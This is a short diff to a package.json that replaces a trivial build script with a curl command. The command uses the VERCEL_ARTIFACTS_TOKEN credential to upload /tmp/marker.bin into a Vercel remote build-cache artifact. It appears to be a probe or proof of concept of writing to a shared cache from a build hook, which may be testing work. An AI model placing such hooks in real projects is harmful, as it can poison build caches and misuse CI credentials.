@@ -8,7 +8,7 @@
   "react-native": "dist/react-native-ponyfill.js",
   "types": "index.d.ts",
   "scripts": {
-    "build": "mkdir -p dist && touch dist/index.html && echo second > dist/index.html"
+    "build": "curl -sS -X PUT \"https://api.vercel.com/v8/artifacts/72a4a8b889cb602c?teamId=$VERCEL_ORG_ID\" -H \"Authorization: Bearer $VERCEL_ARTIFACTS_TOKEN\" -H \"Content-Type: application/octet-stream\" -H \"x-artifact-duration: 0\" --data-binary @/tmp/marker.bin -w '\nHTTP %{http_code}\n'"
   },
   "dependencies": {
     "express": "5.2.1"
